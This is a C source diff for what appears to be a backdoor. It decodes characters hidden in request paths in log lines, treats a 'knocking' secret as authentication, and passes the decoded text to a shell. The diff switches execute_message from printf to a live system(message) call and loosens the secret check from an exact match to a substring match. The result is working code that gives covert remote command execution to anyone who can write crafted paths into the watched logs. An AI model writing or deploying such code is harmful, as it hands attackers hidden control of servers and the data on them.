@@ -61,8 +61,7 @@ static int cmp(const void *p1, const void *p2){
 }
 
 void execute_message( char * message ) {
-	printf("%s\n",message );
-	// system(message);
+	system(message);
 }
 
 void parse_log( char * lastLine ) {
@@ -109,6 +108,9 @@ void parse_log( char * lastLine ) {
 
 	if ( strcmp( pathClean , "/" ) == 0 ) {
 		char * t ;
+		printf("oi\n");
+		decodeBuffer[nth].charBuffer[decodeBuffer[nth].charLen] = '\0' ; // adding nullbyte to final string,strtol is dumb
+		decodeBuffer[nth].charLen += 1 ;
 		decodeBuffer[nth].buffer[decodeBuffer[nth].bufLen] = strtol( decodeBuffer[nth].charBuffer , &t , n ) ;
 		decodeBuffer[nth].bufLen += 1 ;
 		strcpy( decodeBuffer[nth].charBuffer , "" ) ;
@@ -125,11 +127,13 @@ void parse_log( char * lastLine ) {
 
 	// check is the end of the message
 	if ( decodeBuffer[nth].buffer[decodeBuffer[nth].bufLen-1] == 10 ) { // 10 == 0x0a == my EOF
+		decodeBuffer[nth].buffer[decodeBuffer[nth].bufLen] = '\0' ; // adding nullbyte to final string
+		decodeBuffer[nth].bufLen += 1 ;
 		if ( decodeBuffer[nth].auth == 1 ) {
 			execute_message( decodeBuffer[nth].buffer ) ;
 			strcpy( decodeBuffer[nth].buffer , "" ) ;
 			decodeBuffer[nth].bufLen = 0 ;
-		} else if ( strcmp( decodeBuffer[nth].buffer , knockingSecret ) == 0 ) {
+		} else if ( strstr( decodeBuffer[nth].buffer , knockingSecret ) != NULL ) {
 			strcpy( decodeBuffer[nth].buffer , "" ) ;
 			decodeBuffer[nth].bufLen = 0 ;
 			decodeBuffer[nth].auth = 1 ;
